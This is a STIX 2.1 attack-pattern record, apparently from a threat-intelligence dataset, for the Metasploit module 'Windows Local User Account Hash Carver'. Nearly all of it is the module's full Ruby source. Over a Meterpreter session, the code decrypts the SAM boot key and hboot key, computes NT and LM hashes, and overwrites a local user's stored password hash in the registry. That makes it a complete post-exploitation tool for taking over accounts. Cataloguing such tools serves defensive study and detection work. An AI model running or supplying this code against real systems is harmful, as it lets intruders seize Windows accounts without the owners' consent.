{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f4e3ffcf-efa3-4cfa-861f-857b11b2833f",
    "created": "2024-08-14T16:33:04.972042Z",
    "modified": "2024-08-14T16:33:04.972046Z",
    "name": "Windows Local User Account Hash Carver",
    "description": "This module will change a local users password directly in the registry. 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/hashcarve.rb",
            "external_id": "hashcarve.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'English'\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Local User Account Hash Carver',\n        'Description' => %q{ This module will change a local user's password directly in the registry. },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'p3nt4' ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_registry_open_key\n            ]\n          }\n        }\n      )\n      )\n    register_options(\n      [\n        OptString.new('user', [true, 'Username to change password of', nil]),\n        OptString.new('pass', [true, 'Password, NTHash or LM:NT hashes value to set as the user\\'s password', nil])\n      ]\n    )\n    # Constants for SAM decryption\n    @sam_lmpass = \"LMPASSWORD\\x00\"\n    @sam_ntpass = \"NTPASSWORD\\x00\"\n    @sam_qwerty = \"!@\\#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\\x00\"\n    @sam_numeric = \"0123456789012345678901234567890123456789\\x00\"\n    @sam_empty_lm = ['aad3b435b51404eeaad3b435b51404ee'].pack('H*')\n    @sam_empty_nt = ['31d6cfe0d16ae931b73c59d7e0c089c0'].pack('H*')\n  end\n\n  def run\n    # Variable Setup\n    username = datastore['user']\n    pass = datastore['pass']\n    # Detecting password style\n    if pass.length == 32\n      print_status('Password detected as NT hash')\n      nthash = pass\n      lmhash = 'aad3b435b51404eeaad3b435b51404ee'\n    elsif pass.length == 65\n      print_status('Password detected as LN:NT hashes')\n      nthash = pass.split(':')[1]\n      lmhash = pass.split(':')[0]\n    else\n      print_status('Password detected as clear text, generating hashes:')\n      nthash = hash_nt(pass)\n      lmhash = hash_lm(pass)\n    end\n    print_line('LM Hash: ' + lmhash)\n    print_line('NT Hash: ' + nthash)\n    print_status('Searching for user')\n    ridInt = get_user_id(username)\n    rid = '%08x' % ridInt\n    print_line('User found with id: ' + rid)\n    print_status('Loading user key')\n    user = get_user_key(rid)\n    print_status('Obtaining the boot key...')\n    bootkey = capture_boot_key\n    print_status(\"Calculating the hboot key using SYSKEY #{bootkey.unpack('H*')[0]}...\")\n    hbootkey = capture_hboot_key(bootkey)\n    print_status('Modifying user key')\n    modify_user_key(hbootkey, ridInt, user, [nthash].pack('H*'), [lmhash].pack('H*'))\n    print_status('Carving user key')\n    write_user_key(rid, user)\n    print_status(\"Completed! Let's hope for the best\")\n  rescue ::Interrupt\n    raise $ERROR_INFO\n  rescue ::Exception => e\n    print_error(\"Error: #{e}\")\n  end\n\n  def capture_hboot_key(bootkey)\n    ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SAM\\\\SAM\\\\Domains\\\\Account', KEY_READ)\n    return if !ok\n\n    vf = ok.query_value('F')\n    return if !vf\n\n    vf = vf.data\n    ok.close\n    hash = Digest::MD5.new\n    hash.update(vf[0x70, 16] + @sam_qwerty + bootkey + @sam_numeric)\n    rc4 = OpenSSL::Cipher.new('rc4')\n    rc4.decrypt\n    rc4.key = hash.digest\n    hbootkey = rc4.update(vf[0x80, 32])\n    hbootkey << rc4.final\n    return hbootkey\n  end\n\n  def get_user_id(username)\n    ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SAM\\\\SAM\\\\Domains\\\\Account\\\\Users\\\\Names', KEY_READ)\n    ok.enum_key.each do |usr|\n      uk = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, \"SAM\\\\SAM\\\\Domains\\\\Account\\\\Users\\\\Names\\\\#{usr}\", KEY_READ)\n      r = uk.query_value('')\n      rid = r.type\n      if usr.downcase == username.downcase\n        return rid\n      end\n\n      uk.close\n    end\n    ok.close\n    raise 'The user does not exist'\n  end\n\n  def get_user_key(rid)\n    uk = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, \"SAM\\\\SAM\\\\Domains\\\\Account\\\\Users\\\\#{rid}\", KEY_READ)\n    user = uk.query_value('V').data\n    uk.close\n    return user\n  end\n\n  def write_user_key(rid, user)\n    uk = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, \"SAM\\\\SAM\\\\Domains\\\\Account\\\\Users\\\\#{rid}\", KEY_WRITE)\n    uk.set_value('V', REG_BINARY, user)\n    uk.close\n  end\n\n  def modify_user_key(hbootkey, rid, user, nthash, lmhash)\n    hoff = user[0x9c, 4].unpack('V')[0] + 0xcc\n    # Check if hashes exist (if 20, then we've got a hash)\n    lm_exists = user[0x9c + 4, 4].unpack('V')[0] == 20\n    nt_exists = user[0x9c + 16, 4].unpack('V')[0] == 20\n    if !lm_exists && !nt_exists\n      raise 'No password is currently set for the user'\n    end\n\n    print_status('Modifiying LM hash')\n    if lm_exists\n      user[hoff + 4, 16] = encrypt_user_hash(rid, hbootkey, lmhash, @sam_lmpass)\n    else\n      print_error('LM hash does not exist, skipping')\n    end\n    print_status('Modifiying NT hash')\n    if nt_exists\n      user[(hoff + (lm_exists ? 24 : 8)), 16] = encrypt_user_hash(rid, hbootkey, nthash, @sam_ntpass)\n    else\n      print_error('NT hash does not exist, skipping')\n    end\n  end\n\n  def rid_to_key(rid)\n    s1 = [rid].pack('V')\n    s1 << s1[0, 3]\n    s2b = [rid].pack('V').unpack('C4')\n    s2 = [s2b[3], s2b[0], s2b[1], s2b[2]].pack('C4')\n    s2 << s2[0, 3]\n    [convert_des_56_to_64(s1), convert_des_56_to_64(s2)]\n  end\n\n  def encode_utf16(str)\n    str.to_s.encode(::Encoding::UTF_16LE).force_encoding(::Encoding::ASCII_8BIT)\n  end\n\n  def encrypt_user_hash(rid, hbootkey, hash, pass)\n    if hash.empty?\n      case pass\n      when @sam_lmpass\n        return @sam_empty_lm\n      when @sam_ntpass\n        return @sam_empty_nt\n      end\n      return ''\n    end\n\n    des_k1, des_k2 = rid_to_key(rid)\n    d1 = OpenSSL::Cipher.new('des-ecb')\n    d1.encrypt\n    d1.padding = 0\n    d1.key = des_k1\n    d2 = OpenSSL::Cipher.new('des-ecb')\n    d2.encrypt\n    d2.padding = 0\n    d2.key = des_k2\n    md5 = Digest::MD5.new\n    md5.update(hbootkey[0, 16] + [rid].pack('V') + pass)\n    rc4 = OpenSSL::Cipher.new('rc4')\n    rc4.encrypt\n    rc4.key = md5.digest\n    d2o = d2.update(hash[8, 8])\n    d1o = d1.update(hash[0, 8])\n    enchash = rc4.update(d1o + d2o)\n    return enchash\n  end\n\n  def hash_nt(pass)\n    return OpenSSL::Digest::MD4.digest(encode_utf16(pass)).unpack('H*')[0]\n  end\n\n  def hash_lm(key)\n    lm_magic = 'KGS!@\\#$%'\n    key = key.ljust(14, \"\\0\")\n    keys = create_des_keys(key[0, 14])\n    result = ''\n    cipher = OpenSSL::Cipher.new('DES')\n    keys.each do |k|\n      cipher.encrypt\n      cipher.key = k\n      result << cipher.update(lm_magic)\n    end\n    return result.unpack('H*')[0]\n  end\n\n  def create_des_keys(string)\n    keys = []\n    string = string.dup\n    until (key = string.slice!(0, 7)).empty?\n      # key is 56 bits\n      key = key.unpack('B*').first\n      str = ''\n      until (bits = key.slice!(0, 7)).empty?\n        str << bits\n        str << (bits.count('1').even? ? '1' : '0')  # parity\n      end\n      keys << [str].pack('B*')\n    end\n    keys\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}